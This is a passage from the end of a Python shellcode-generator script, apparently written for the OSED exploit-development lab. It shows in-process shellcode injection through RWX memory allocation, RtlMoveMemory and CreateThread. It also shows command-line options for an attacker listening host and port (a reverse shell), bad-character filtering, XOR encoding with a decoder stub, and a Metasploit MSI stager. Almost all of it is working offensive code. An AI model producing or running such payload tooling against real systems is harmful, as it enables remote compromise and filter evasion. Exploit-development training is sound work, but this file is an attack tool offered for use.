                ctypes.c_int(0x40),  
            )
            
            buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
            ctypes.windll.kernel32.RtlMoveMemory(
                ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
            )
            
            print(f"[+] Shellcode mapped at: {hex(ptr)}")
            input("[?] Press ENTER to execute...")
            
            ht = ctypes.windll.kernel32.CreateThread(
                ctypes.c_int(0), 0, ctypes.c_int(ptr), 0, 0, ctypes.pointer(ctypes.c_int(0))
            )
            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
        else:
            print(f"{Fore.YELLOW}[!] Local test skipped: System is not x86 (32-bit).{Style.RESET_ALL}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Creates shellcodes compatible with the OSED lab VM"
    )

    parser.add_argument("-l", "--lhost", help="listening attacker system (default: 127.0.0.1)", default="127.0.0.1")
    parser.add_argument("-p", "--lport", help="listening port of the attacker system (default: 4444)", default="4444")
    parser.add_argument("-b", "--bad-chars", help="space separated list of bad chars (default: 00)", default=["00"], nargs="+")
    parser.add_argument("-m", "--msi", help="use an msf msi exploit stager (short)", action="store_true")
    parser.add_argument("-k", "--key", help="encodes selected shellcode with key value and pushes decoding stub (default: 0x12341234)", const="0x12341234", nargs='?')
    parser.add_argument("--messagebox", help="create a message box payload", action="store_true")
    parser.add_argument("--mb-header", help="message box header text")
    parser.add_argument("--mb-text", help="message box text")
    parser.add_argument("-d", "--debug-break", help="add a software breakpoint as the first shellcode instruction", action="store_true")
    parser.add_argument("-t", "--test-shellcode", help="test the shellcode on the system", action="store_true")
    parser.add_argument("-s", "--store-shellcode", help="store the shellcode in binary format in the file shellcode.bin", action="store_true")
    
    args = parser.parse_args()
    main(args)